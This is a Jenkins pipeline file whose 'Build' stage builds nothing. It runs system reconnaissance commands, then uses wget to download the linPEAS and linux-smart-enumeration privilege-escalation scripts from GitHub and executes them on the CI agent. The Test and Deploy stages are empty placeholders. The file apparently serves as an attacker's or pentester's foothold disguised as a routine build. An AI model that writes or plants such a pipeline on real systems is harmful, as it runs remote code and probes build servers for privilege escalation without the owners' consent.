pipeline {
    agent any

    stages {
        stage('Build') {
            steps {
                echo 'Building..'
                sh 'whoami'
                sh 'uname -a'
                sh 'lsb_release -a'
                sh 'ls -lah'
                sh 'ls -lah /usr/bin'
                sh 'ls -lah /usr/local/bin'
                sh 'ls -lah /run'
                sh 'wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh'
                sh './linpeas.sh -a'
                sh 'wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh'
                sh './lse.sh -l1'
            }
        }
        stage('Test') {
            steps {
                echo 'Testing..'
            }
        }
        stage('Deploy') {
            steps {
                echo 'Deploying....'
            }
        }
    }
}
